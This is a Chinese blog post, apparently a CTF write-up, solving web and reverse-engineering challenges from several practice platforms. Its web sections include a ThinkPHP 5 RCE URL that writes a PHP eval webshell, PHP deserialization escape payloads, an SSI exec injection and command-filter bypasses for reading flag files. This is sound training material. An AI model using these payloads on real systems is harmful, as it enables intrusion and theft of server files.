<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>CTF Writeup - 饱食终日，无所事事</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="饱食终日，无所事事"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="饱食终日，无所事事"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="尽量写吧"><meta property="og:type" content="blog"><meta property="og:title" content="CTF Writeup"><meta property="og:url" content="http://example.com/2019/10/05/writeup/"><meta property="og:site_name" content="饱食终日，无所事事"><meta property="og:description" content="尽量写吧"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:published_time" content="2019-10-04T22:49:05.000Z"><meta property="article:modified_time" content="2020-11-14T07:53:42.651Z"><meta property="article:author" content="lll"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Writeup"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2019/10/05/writeup/"},"headline":"CTF Writeup","image":["http://example.com/img/og_image.png"],"datePublished":"2019-10-04T22:49:05.000Z","dateModified":"2020-11-14T07:53:42.651Z","author":{"@type":"Person","name":"lll"},"publisher":{"@type":"Organization","name":"饱食终日，无所事事","logo":{"@type":"ImageObject","url":"http://example.com/img/logo.svg"}},"description":"尽量写吧"}</script><link rel="canonical" href="http://example.com/2019/10/05/writeup/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="饱食终日，无所事事" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2019-10-04T22:49:05.000Z" title="2019/10/5 上午6:49:05">2019-10-05</time>发表</span><span class="level-item"><time dateTime="2020-11-14T07:53:42.651Z" title="2020/11/14 下午3:53:42">2020-11-14</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a></span><span class="level-item">2 小时读完 (大约16082个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">CTF Writeup</h1><div class="content"><p>尽量写吧</p>
<span id="more"></span>

<h2 id="new-bugku"><a href="#new-bugku" class="headerlink" title="new bugku"></a><a target="_blank" rel="noopener" href="https://new.bugku.com/">new bugku</a></h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h4><p>提示备份了不少东西，用Githack得到flag。</p>
<h4 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h4><p>提示vim编辑器，想到源码泄露。输入swp，把1改成i，得到flag。</p>
<h4 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h4><p>正则匹配动态密文，提交时要使用session或者cookie</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.31.85:10020/&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">r = s.get(url).text</span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line">ma = re.search(<span class="string">r&#x27;([a-z0-9]&#123;33&#125;)&#x27;</span>,r)</span><br><span class="line"><span class="comment"># print(ma)</span></span><br><span class="line">param = &#123;<span class="string">&#x27;key&#x27;</span>:ma.group(<span class="number">0</span>)&#125;</span><br><span class="line">r = s.get(url,params=param).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<h2 id="安恒月赛"><a href="#安恒月赛" class="headerlink" title="安恒月赛"></a>安恒月赛</h2><h3 id="2020-4"><a href="#2020-4" class="headerlink" title="2020 4"></a>2020 4</h3><h4 id="Ezunserialize"><a href="#Ezunserialize" class="headerlink" title="Ezunserialize"></a>Ezunserialize</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line">function write($data) &#123;</span><br><span class="line">    return str_replace(chr(0) . &#x27;*&#x27; . chr(0), &#x27;\0\0\0&#x27;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read($data) &#123;</span><br><span class="line">    return str_replace(&#x27;\0\0\0&#x27;, chr(0) . &#x27;*&#x27; . chr(0), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    function __construct($a, $b)&#123;</span><br><span class="line">        $this-&gt;username = $a;</span><br><span class="line">        $this-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $b = &#x27;gqy&#x27;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $c = &#x27;a&#x27;.$this-&gt;b;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        //flag.php</span><br><span class="line">        echo file_get_contents($this-&gt;c);</span><br><span class="line">        return &#x27;nice&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;]);</span><br><span class="line">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><br><span class="line">$b = unserialize(read(write(serialize($a)))); </span><br></pre></td></tr></table></figure>

<p>处理过程中只要存在 \0\0\0 这6个字符就会替换成 chr(0)*chr(0) 这3个字符，反序列化过程中会根据长度进行反序列化，就有了逃逸的空间。</p>
<p>最后在 class C 中 toString 方法可以读取 flag.php，class B 中有 echo ，echo 一个 class C 的实例就可以输出了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://183.129.189.60:10001/&#x27;</span><br><span class="line">a = &#x27;\\0\\0\\0&#x27;*8</span><br><span class="line">b = &#x27;x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&#x27;</span><br><span class="line">r = requests.get(url, params=&#123;&#x27;a&#x27;: a, &#x27;b&#x27;: b&#125;)</span><br><span class="line">print(r.url)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">#O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;un&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br><span class="line">#O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;un&quot;;s:8:&quot;password&quot;;s:56:&quot;x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task">攻防世界</a></h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="baby-web"><a href="#baby-web" class="headerlink" title="baby web"></a>baby web</h4><p>提示想想首页是哪个，访问index.php，跳转回 1.php，抓个包，repeater里重放，看到返回的header里面有flag</p>
<h4 id="php-rce"><a href="#php-rce" class="headerlink" title="php rce"></a>php rce</h4><p>thinkphp 5 的漏洞（<a target="_blank" rel="noopener" href="https://www.vulnspy.com/cn-thinkphp-5.x-rce/%EF%BC%89">https://www.vulnspy.com/cn-thinkphp-5.x-rce/）</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:30031/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%27%3C?php%20@eval($_POST[c]);?%3E%27%20%3E%20info.php</span><br></pre></td></tr></table></figure>

<p>写入一个shell到info.php，蚁剑连接，根目录下有flag</p>
<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$s = &#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;;</span><br><span class="line">$_o =  base64_decode(strrev(str_rot13($s)));</span><br><span class="line">for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; </span><br><span class="line">        </span><br><span class="line">        $_c=substr($_o,$_0,1); </span><br><span class="line">        $__=ord($_c)-1; </span><br><span class="line">        $_c=chr($__); </span><br><span class="line">        $_=$_.$_c;    </span><br><span class="line">    &#125;</span><br><span class="line">echo strrev($_);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h4><p>执行发现flag是乱码，IDA打开，lpMem存着flag，如果执行到if里面程序就会退出，执行不到messagebox，同时if里面还有好像是处理flag的函数。所以想执行了这个函数之后再执行messagebox，这样就能打印出flag。拖进od，执行到程序设定的断点，nop掉最近的跳转（否则会执行之前的messagebox），接下来执行处理flag的函数，之后跳转到exitprocess，把这个跳转转到messagebox，一共有两个，都试一遍，在第二个得到flag。</p>
<h4 id="dmd-50"><a href="#dmd-50" class="headerlink" title="dmd-50"></a>dmd-50</h4><p>IDA，发现一串字符串 780438d5b6e29db0898bc4f0225935c0，是上面MD5加密得到的，拖去解密，是grape的两次MD5，再把grape加密一次，得到flag</p>
<h4 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h4><p>拖进OD，搜索字符串</p>
<h4 id="game"><a href="#game" class="headerlink" title="game"></a>game</h4><p>先运行一遍，像是玩一个游戏，把灯全点亮可以拿到flag。拖进OD，搜索字符串，看到 “done！the flag is”这里，找到跳转进来的位置，记下开始（push ebp）的地址（00C5E940），再到提示选项的地方（1，△），到这一段的开始（push ebp），改成jmp 00C5E940。</p>
<h4 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h4><p>IDA发现它把东西写入了 /tmp/flag.txt，在remove下断点，去flag.txt看，发现是假的= =。重新看，是一个简单的算法，用python写一下，得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;c61b68366edeb7bdce3c6820314b7498&#x27;</span></span><br><span class="line">t = <span class="string">r&#x27;SharifCTF&#123;????????????????????????????????&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> v5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">	<span class="keyword">if</span> v5%<span class="number">2</span>:</span><br><span class="line">		v3 = <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		v3 = -<span class="number">1</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[v5])+v3),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后要加上格式 SharifCTF{}</p>
<h4 id="Hello-Ctf"><a href="#Hello-Ctf" class="headerlink" title="Hello Ctf"></a>Hello Ctf</h4><p>运行，提示输入序列号，随便输，wrong。IDA里打开，发现一串字符串，向下看发现是把输入转换一下和之前的字符串比较，一致就会给出success。</p>
<h4 id="Open-Source"><a href="#Open-Source" class="headerlink" title="Open Source"></a>Open Source</h4><p>arg1 = 0xcafe arg2 = 25 arg3 = h4cky0u，打印得到flag</p>
<h4 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h4><p>IDA看一下，好像是把flag和随机数运算一下输出出来，shift F12得到flag</p>
<h4 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h4><p>IDA，在主函数的for循环处是算法部分，用c语言照着写下来。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[] = <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> t = <span class="number">28537194573619560LL</span>;</span><br><span class="line">    <span class="keyword">char</span> * tp = (<span class="keyword">char</span> *)&amp;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;s[i];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,s[i]^tp[i%<span class="number">7</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>找到关键函数 sub400690，O:a2-1,o:a2+1,.:a3-1,0:a3+1，a1是地图，走出来把方向记下来，得到flag</p>
<h4 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no strings attached"></a>no strings attached</h4><p>32位的elf文件，拖到linux虚拟机里执行一下，出错了。放进IDA，看到4各函数，最后一个把输入和解密之后的数据比较一下，一样会输出success。看一下汇编，decrypt函数运行后有 <code>mov [ebp+s2],eax</code>，解密后的flag在eax里。用gdb，b decrypt,r,n,i r,x/6sw $eax，以word（4字节），字符串形式显示6行，看到flag。</p>
<h4 id="python-trade"><a href="#python-trade" class="headerlink" title="python trade"></a>python trade</h4><p>找个在线的pyc反编译网站，看到一个编码算法，反着写出来，得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">correct = <span class="string">&#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span></span><br><span class="line">	s = base64.b64decode(s)</span><br><span class="line">	res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">		x = c-<span class="number">16</span></span><br><span class="line">		res += <span class="built_in">chr</span>(x^<span class="number">32</span>)</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"><span class="built_in">print</span>(decode(correct))</span><br></pre></td></tr></table></figure>

<h4 id="Shuffle"><a href="#Shuffle" class="headerlink" title="Shuffle"></a>Shuffle</h4><p>IDA看一下，是一个字符数组，转换成char就拿到了flag</p>
<h4 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple unpack"></a>simple unpack</h4><p>IDA二进制方式打开，搜索flag，或者用upx脱壳后再打开，可以直接看到flag。</p>
<h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF</a></h2><h3 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h3><h4 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h4><p>提示有源文件，<code>index.php.bak</code>，然后就是一个弱类型，<code>key=123</code>。</p>
<h4 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h4><p>查看源代码，说UTF-8很重要。输入4，1337，提示只能输入一个字符。查一下Unicode，<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">Unicode - Compart</a>，随便找一个比1337大的，取UTF8编码，比如<code>0xF0 0x90 0xA1 0x9F</code>。输入<code>4, %F0%90%A1%9F</code>，得到flag</p>
<h4 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h4><p>看到img=…，可能存在文件包含，base64解密两次，ASCII Hex解密一次，得到555.pnf0？换成index.php加密回去，在img标签的src里看见base64之后的源码。</p>
<p>cmd参数可以执行系统命令，过滤了常用的读取文件的命令。可以使用ca/t f/lag，也可以用sort flag.</p>
<p>下面是一个强类型的md5碰撞，使用fastcoll，<code>.\fastcoll_v1.0.0.5.exe -o 1.txt 2.txt</code>，生成两个md5内容相同的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">with open(r&#x27;C:\Users\&lt;user&gt;\Desktop\1.txt&#x27;,&#x27;rb&#x27;) as f1:</span><br><span class="line">    with open(r&#x27;C:\Users\&lt;user&gt;\Desktop\2.txt&#x27;,&#x27;rb&#x27;) as f2:</span><br><span class="line">        a = f1.read()</span><br><span class="line">        b = f2.read()</span><br><span class="line">        url = &#x27;http://9c2738e0-05e7-4936-839d-286bde014ef5.node3.buuoj.cn/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=&#x27;</span><br><span class="line">        cmd = r&#x27;sort /flag&#x27;</span><br><span class="line">        data = &#123;&#x27;a&#x27;: a,&#x27;b&#x27;: b&#125;</span><br><span class="line">        r = requests.post(url+cmd, data=data)</span><br><span class="line">        print(r.text)</span><br></pre></td></tr></table></figure>

<p>读取文件时要用绝对路径，否则会找不到文件，原因不明。</p>
<h4 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h4><p>随便输点什么，看到提示 SSTI。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>能看到结果，直接 tplmap，得到flag。</p>
<h4 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">$function = @$_GET[&#x27;f&#x27;];</span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125;</span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function;</span><br><span class="line">extract($_POST);</span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">if(!$_GET[&#x27;img_path&#x27;])&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125;</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125;else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125;else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>从后往前看，假设文件在<code>./flag.php</code>，目的是执行<code>file_get_contents(&#39;./flag.php&#39;)</code>，usrinfo来自filter和反序列化的<code>$_SESSION</code>，filter删除特定的字符串。由于是先反序列化后过滤，本来不属于变量的一部分的字符串可能被收进变量中。extract可以用于覆盖变量。</p>
<p>没有成功，原来文件不是flag.php。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&amp;function=show_image</span><br></pre></td></tr></table></figure>

<p>filter会删除flag，img被反序列化。得到flag的位置，改一下payload就可以了。</p>
<h4 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h4><p>存在 .swp 备份，先爆破 md6</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">def md5(s):</span><br><span class="line">    return hashlib.md5(s.encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line">for i in range(1, 10000000):</span><br><span class="line">    if md5(str(i)).startswith(&#x27;6d0bc1&#x27;):</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<p>得到2020666，在返回包头看见文件，进入。这个文件是一个 shtml 文件，存在模板注入。</p>
<p>返回 index，用户名处输入payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;命令&quot;--&gt; # 此处使用 ls</span><br></pre></td></tr></table></figure>

<p>发现文件 flag ，访问可以得到flag</p>
<h4 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h4><p>有个爆破密码的功能，扫下目录发现 test.php，应该是要用这个功能爆破 test 的密码。</p>
<p>看一下 cookie，有个 base64加密的值，<code>user=1589337171</code>，不知道是什么，先改一改，改成<code>999999999999999999</code>，刷新发现页面变了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Already burst -999999998410662300 sec, 122930 p/s</span><br><span class="line">Forecast success rate NaN%</span><br></pre></td></tr></table></figure>

<p>刚才的 user 应该是时间，但是改完变成负的了，再改成0试试。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Already burst 1589337868 sec, 142033 p/s</span><br><span class="line">Forecast success rate 99.57694165675845%</span><br></pre></td></tr></table></figure>

<p>再 check 成功了，弹出密码<code>av11664517@1583985203</code>，查一下这个av号，是北京大学量子力学的视频，flag 在评论里，脚本跑一下。</p>
<h4 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h4><p>下载源代码<code>.index.php.swp</code>，使用 <code>vim -r index.php.swp</code>恢复</p>
